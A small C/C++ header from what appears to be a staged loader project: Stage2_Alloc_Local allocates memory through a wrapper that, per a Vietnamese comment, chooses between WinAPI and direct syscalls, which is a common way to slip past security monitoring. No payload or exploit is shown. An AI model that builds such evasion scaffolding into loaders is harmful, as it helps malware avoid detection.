#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"

LPVOID Stage2_Alloc_Local(int size) {
    // Wrapper MyVirtualAlloc đã xử lý WinAPI vs Syscall
    LPVOID mem = MyVirtualAlloc(size);

    #ifdef DEBUG_MODE
        if (mem) {
            DEBUG_MSG("Stage 2", "Allocated at: %p", mem);
        }
    #endif

    return mem;
}